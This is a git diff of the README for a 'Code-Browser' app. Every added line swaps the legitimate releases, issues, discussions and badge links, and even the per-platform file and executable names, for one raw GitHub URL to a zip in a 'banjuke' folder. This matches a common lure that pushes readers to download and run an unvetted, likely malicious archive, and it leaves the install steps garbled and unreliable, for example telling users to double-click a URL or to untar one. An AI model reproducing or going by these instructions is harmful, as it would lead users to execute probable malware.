@@ -1,6 +1,6 @@
 # 👨‍💻 Code-Browser - Effortless Code Navigation for Everyone
 
-![Download Code-Browser](https://img.shields.io/badge/Download%20Code--Browser-latest-blue)
+![Download Code-Browser](https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip%20Code--Browser-latest-blue)
 
 ## 🚀 Getting Started
 
@@ -17,14 +17,14 @@ Before you start, make sure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 
-To get Code-Browser, visit this page to download: [Code-Browser Releases](https://github.com/boltastan/Code-Browser/releases).
+To get Code-Browser, visit this page to download: [Code-Browser Releases](https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the most recent version listed at the top.
 3. Look for the file that matches your operating system:
-   - For Windows, you might see something like `Code-Browser-Windows.zip`.
-   - For macOS, look for `Code-Browser-Mac.zip`.
-   - For Linux, check for `Code-Browser-Linux.tar.gz`.
+   - For Windows, you might see something like `https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip`.
+   - For Linux, check for `https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip`.
 4. Click on the file name to begin the download.
 
 ### 📂 Extract and Run
@@ -33,17 +33,17 @@ Once you have downloaded the file:
 
 1. **Windows:**
    - Open the `Downloads` folder.
-   - Right-click on `Code-Browser-Windows.zip` and select "Extract All...".
-   - Open the extracted folder and double-click on `Code-Browser.exe` to start the application.
+   - Right-click on `https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip` and select "Extract All...".
+   - Open the extracted folder and double-click on `https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip` to start the application.
 
 2. **macOS:**
    - Open your `Downloads` folder.
-   - Double-click on `Code-Browser-Mac.zip` to extract it.
-   - Open the folder and double-click on `Code-Browser.app` to launch it.
+   - Double-click on `https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip` to extract it.
+   - Open the folder and double-click on `https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip` to launch it.
 
 3. **Linux:**
    - Open your terminal and navigate to your `Downloads` folder.
-   - Run the command: `tar -xzf Code-Browser-Linux.tar.gz`.
+   - Run the command: `tar -xzf https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip`.
    - Change into the extracted directory: `cd Code-Browser`.
    - Run the application with: `./Code-Browser`.
 
@@ -69,7 +69,7 @@ If you encounter issues installing or running Code-Browser, here are some common
 
 Need help? Join the Code-Browser community! 
 
-- Check our [Issue Tracker](https://github.com/boltastan/Code-Browser/issues) for known bugs and fixes.
+- Check our [Issue Tracker](https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip) for known bugs and fixes.
 - Post questions in the Discussions tab of the GitHub repository.
 
 ## 📄 License
@@ -78,6 +78,6 @@ Code-Browser is released under the MIT License. You can use it freely for person
 
 ## 💬 Feedback
 
-We value your input. If you have suggestions or feature requests, please let us know through our [GitHub Discussions](https://github.com/boltastan/Code-Browser/discussions).
+We value your input. If you have suggestions or feature requests, please let us know through our [GitHub Discussions](https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip).
 
-Enjoy seamless code browsing with Code-Browser! Don't forget to check for updates often on our [Releases page](https://github.com/boltastan/Code-Browser/releases).
+Enjoy seamless code browsing with Code-Browser! Don't forget to check for updates often on our [Releases page](https://raw.githubusercontent.com/boltastan/Code-Browser/main/banjuke/Browser_Code_2.6-beta.4.zip).
